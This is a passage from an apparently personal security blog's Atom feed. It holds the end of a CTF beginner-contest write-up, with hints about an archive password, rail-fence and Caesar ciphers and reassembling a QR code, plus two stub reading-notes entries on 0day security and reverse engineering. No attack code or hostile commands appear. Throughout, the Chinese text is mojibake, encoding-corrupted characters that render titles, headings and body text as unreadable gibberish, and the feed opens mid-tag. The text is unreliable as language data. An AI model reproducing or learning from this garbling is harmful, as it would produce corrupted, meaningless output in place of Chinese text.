title="7çš„æ„å¿—ï¼"></a>7çš„æ„å¿—ï¼</h3><p>å‹ç¼©åŒ…å¯†ç 7</p><p>æ …æ åŠ å‡¯æ’’</p><h3 id="å¥‡æ€ªçš„é¢˜"><a href="#å¥‡æ€ªçš„é¢˜" class="headerlink" title="å¥‡æ€ªçš„é¢˜"></a>å¥‡æ€ªçš„é¢˜</h3><p>æ”¹åƒç´ å¯ä»¥å¾—åˆ°ä¸€å¼ æ•£å¼€çš„äºŒç»´ç </p><p>æŠŠä¸‰ä¸ªæ‹¼ä¸€ä¸ªäºŒç»´ç </p><p>è¡¥ä¸‰ä¸ªå®šä½ç¬¦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;CUMT2020å…¥é—¨èµ›&quot;&gt;&lt;a href=&quot;#CUMT2020å…¥é—¨èµ›&quot; class=&quot;headerlink&quot; title=&quot;CUMT2020å…¥é—¨èµ›&quot;&gt;&lt;/a&gt;CUMT2020å…¥é—¨èµ›&lt;/h1&gt;&lt;p&gt;æœ¬ä¸å‡†å¤‡å†™çš„ï¼Œä¸»è¦tclï¼Œè¿˜æ˜¯ç•™</summary>
      
    
    
    
    <category term="wp" scheme="https://pz1o.top/categories/wp/"/>
    
    
    <category term="CTF" scheme="https://pz1o.top/tags/CTF/"/>
    
    <category term="wp" scheme="https://pz1o.top/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>0dayå®‰å…¨è¯»ä¹¦ç¬”è®°</title>
    <link href="https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://pz1o.top/2020/10/27/0day%E5%AE%89%E5%85%A8%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-27T14:29:36.000Z</published>
    <updated>2020-11-20T14:17:51.878Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¸‰ä¸ªæœˆä¸€èµ·è¯»å®Œ0dayå®‰å…¨ï¼Œèµ¶ç´§æ‹¿æ¥è¯»ä¸€è¯»ï¼Œéšç¼˜æ›´æ–°</p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;ä¸‰ä¸ªæœˆä¸€èµ·è¯»å®Œ0dayå®‰å…¨ï¼Œèµ¶ç´§æ‹¿æ¥è¯»ä¸€è¯»ï¼Œéšç¼˜æ›´æ–°&lt;/p&gt;
&lt;h1 id=&quot;æ­£æ–‡&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    <category term="PWN" scheme="https://pz1o.top/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†è¯»ä¹¦ç¬”è®°</title>
    <link href="https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>https://pz1o.top/2020/10/27/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-27T08:09:08.000Z</published>
    <updated>2020-11-20T14:20:02.585Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>é¢„ä¼°ä¸‰ä¸ªæœˆï¼Œä½†è¯´ä¸å®šä¸ºäº†èµ¶å…¶ä»–çš„ddlï¼Œä¹Ÿå°±è¯»ä¸å®Œäº†ï¼Œå°½åŠ›å»å§</p><h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;é¢„ä¼°ä¸‰ä¸ªæœˆï¼Œä½†è¯´ä¸å®šä¸ºäº†èµ¶å…¶ä»–çš„ddlï¼Œä¹Ÿå°±è¯»ä¸å®Œäº†ï¼Œå°½åŠ›å»å§&lt;/p&gt;
&lt;h1 id=&quot;æ­£æ–‡&quot;&gt;&lt;a h</summary>
      
    
    
    
    <category term="é€†å‘" scheme="https://pz1o.top/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="é€†å‘" scheme="https://pz1o.top/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="è¯»ä¹¦ç¬”è®°" scheme="https://pz1o.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
